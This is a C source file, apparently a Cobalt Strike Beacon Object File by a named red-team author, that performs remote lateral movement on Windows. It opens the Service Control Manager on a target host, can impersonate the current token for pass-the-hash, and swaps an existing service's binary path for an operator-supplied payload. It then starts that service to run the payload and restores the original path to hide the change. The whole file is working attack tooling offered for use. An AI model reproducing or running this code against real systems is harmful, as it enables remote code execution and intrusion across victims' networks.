// Author: Mr.Un1k0d3r RingZer0 Team

#include <windows.h>
#include <stdio.h>
#include "beacon.h"

#define LOGON32_LOGON_NEW_CREDENTIALS 9

DECLSPEC_IMPORT BOOL WINAPI Advapi32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI Advapi32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT SC_HANDLE WINAPI Advapi32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI Advapi32$OpenServiceA(SC_HANDLE, LPCSTR, DWORD);
DECLSPEC_IMPORT BOOL WINAPI Advapi32$QueryServiceConfigA(SC_HANDLE, LPQUERY_SERVICE_CONFIGA, DWORD, LPDWORD);
DECLSPEC_IMPORT HGLOBAL WINAPI kernel32$GlobalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HGLOBAL WINAPI kernel32$GlobalFree(HGLOBAL);
DECLSPEC_IMPORT BOOL WINAPI Advapi32$ChangeServiceConfigA(SC_HANDLE, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR, LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI Advapi32$StartServiceA(SC_HANDLE,DWORD, LPCSTR*);
DECLSPEC_IMPORT BOOL WINAPI Advapi32$CloseServiceHandle(SC_HANDLE);
DECLSPEC_IMPORT DWORD WINAPI kernel32$GetLastError();
DECLSPEC_IMPORT HANDLE WINAPI kernel32$GetCurrentProcess();
DECLSPEC_IMPORT BOOL WINAPI kernel32$CloseHandle(HANDLE);

void go(char * args, int length) {
    // Parse Beacon Arguments
    datap parser;
    CHAR * targetHost;
    CHAR * serviceName;
    CHAR * payload;

    BeaconDataParse(&parser, args, length);
    targetHost = BeaconDataExtract(&parser, NULL);
    serviceName = BeaconDataExtract(&parser, NULL);
    payload = BeaconDataExtract(&parser, NULL);

    LPQUERY_SERVICE_CONFIGA lpqsc = NULL;
    DWORD dwLpqscSize = 0;
    CHAR* originalBinaryPath = NULL;
    BOOL bResult = FALSE;

    BeaconPrintf(CALLBACK_OUTPUT, "Trying to connect to %s\n", targetHost);

#ifdef _IMP
    HANDLE hToken = NULL;

	BeaconPrintf(CALLBACK_OUTPUT,  "Using current process context for authentication. (Pass the hash)\n");
	if(!Advapi32$OpenProcessToken(kernel32$GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
		BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$OpenProcessToken failed %ld\n", kernel32$GetLastError());
		return;
	}

    bResult = FALSE;
    bResult = Advapi32$ImpersonateLoggedOnUser(hToken);
    if(!bResult) {
        BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$ImpersonateLoggedOnUser failed %ld\n", kernel32$GetLastError());
        return;
    }
#endif

    SC_HANDLE schManager = Advapi32$OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
    if(schManager == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$OpenSCManagerA failed %ld\n", kernel32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "SC_HANDLE Manager 0x%p\n", schManager);

    BeaconPrintf(CALLBACK_OUTPUT, "Opening %s\n", serviceName);
    SC_HANDLE schService = Advapi32$OpenServiceA(schManager, serviceName, SERVICE_ALL_ACCESS);
    if(schService == NULL) {
	Advapi32$CloseServiceHandle(schManager);
        BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$OpenServiceA failed %ld\n", kernel32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "SC_HANDLE Service 0x%p\n", schService);

    DWORD dwSize = 0;
    Advapi32$QueryServiceConfigA(schService, NULL, 0, &dwSize);
    if(dwSize) {
        // This part is not critical error will not stop the program
        dwLpqscSize = dwSize;
        BeaconPrintf(CALLBACK_OUTPUT, "LPQUERY_SERVICE_CONFIGA need 0x%08x bytes\n", dwLpqscSize);
        lpqsc = kernel32$GlobalAlloc(GPTR, dwSize);
        bResult = FALSE;
        bResult = Advapi32$QueryServiceConfigA(schService, lpqsc, dwLpqscSize, &dwSize);
        originalBinaryPath = lpqsc->lpBinaryPathName;
        BeaconPrintf(CALLBACK_OUTPUT, "Original service binary path \"%s\"\n", originalBinaryPath);
    }

    bResult = FALSE;
    bResult = Advapi32$ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, NULL, NULL, NULL, NULL, NULL, NULL);
    if(!bResult) {
        BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$ChangeServiceConfigA failed to update the service path. %ld\n", kernel32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Service path was changed to \"%s\"\n", payload);

    bResult = FALSE;
    bResult = Advapi32$StartServiceA(schService, 0, NULL);
    DWORD dwResult = kernel32$GetLastError();
    if(!bResult && dwResult != 1053) {
        BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$StartServiceA failed to start the service. %ld\n", kernel32$GetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Service was started\n");
    }

    if(dwLpqscSize) {
        bResult = FALSE;
        bResult = Advapi32$ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, NULL, NULL, NULL, NULL, NULL, NULL);
        if(!bResult) {
            BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$ChangeServiceConfigA failed to revert the service path. %ld\n", kernel32$GetLastError());
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "Service path was restored to \"%s\"\n", originalBinaryPath);
    }
	
    kernel32$GlobalFree(lpqsc);
#ifdef _IMP
    kernel32$CloseHandle(hToken);
#endif
    Advapi32$CloseServiceHandle(schManager);
    Advapi32$CloseServiceHandle(schService);
}
